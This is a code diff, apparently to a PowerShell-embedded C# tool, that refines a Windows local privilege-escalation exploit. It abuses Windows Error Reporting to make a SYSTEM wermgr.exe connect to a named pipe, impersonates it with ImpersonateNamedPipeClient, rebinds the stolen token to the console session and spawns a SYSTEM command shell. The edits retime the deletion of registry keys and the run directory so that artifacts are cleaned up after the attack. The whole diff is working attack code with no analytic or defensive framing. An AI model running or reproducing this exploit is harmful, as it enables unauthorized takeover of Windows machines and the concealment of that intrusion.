@@ -275,12 +275,11 @@ if($r-eq 0){
             {UseShellExecute=false,CreateNoWindow=true};
         using(var p=System.Diagnostics.Process.Start(psi)) p.WaitForExit(3000);
 
-        Thread.Sleep(1500);
-        /* Clean MiniPlasma artifacts immediately */
+        /* Only clean registry now; leave runDir alive until WER executes wermgr.exe */
+        Thread.Sleep(500);
         try{RecDelete(CF);}catch{}
         try{RecDelete(TK);}catch{}
-        try{if(Directory.Exists(runDir))Directory.Delete(runDir,true);}catch{}
-        Console.WriteLine("[+] Artifacts cleaned");
+        Console.WriteLine("[+] Registry cleaned, waiting for WER to fire...");
         return true;
     }
 
@@ -660,11 +659,13 @@ if($r-eq 0){
             escPipe.Dispose(); return;
         }
 
-        /* Wait for SYSTEM wermgr.exe to connect */
+        /* Wait for SYSTEM wermgr.exe to connect (give WER up to 25s to fire) */
         Console.WriteLine("[*] Waiting for SYSTEM to connect...");
-        if (!escPipe.WaitForConnectionAsync().Wait(20000)) {
+        if (!escPipe.WaitForConnectionAsync().Wait(25000)) {
             Console.WriteLine("[-] Timed out waiting for SYSTEM");
-            escPipe.Dispose(); return;
+            escPipe.Dispose();
+            try{Directory.Delete(runDir,true);}catch{}
+            return;
         }
         Console.WriteLine("[+] SYSTEM connected");
 
@@ -672,7 +673,9 @@ if($r-eq 0){
         IntPtr systemToken = IntPtr.Zero;
         if (!ImpersonateNamedPipeClient(escPipe.SafePipeHandle.DangerousGetHandle())) {
             Console.WriteLine($"[-] ImpersonateNamedPipeClient failed: {Marshal.GetLastWin32Error()}");
-            escPipe.Dispose(); return;
+            escPipe.Dispose();
+            try{Directory.Delete(runDir,true);}catch{}
+            return;
         }
 
         IntPtr impToken;
@@ -685,9 +688,13 @@ if($r-eq 0){
         uint session = WTSGetActiveConsoleSessionId();
         SetTokenInformation(systemToken, 12, ref session, 4);
 
-        /* Signal SYSTEM wermgr.exe that we're done */
+        /* Signal SYSTEM wermgr.exe that it can exit */
         try { escPipe.Write(new byte[]{1}, 0, 1); escPipe.Flush(); } catch {}
         escPipe.Dispose();
+
+        /* Clean up runDir now that wermgr.exe has been launched */
+        Thread.Sleep(500);
+        try{Directory.Delete(runDir,true);}catch{}
 
         /* Spawn SYSTEM cmd in this console */
         Console.WriteLine("[+] Got SYSTEM token. Launching shell...\n");
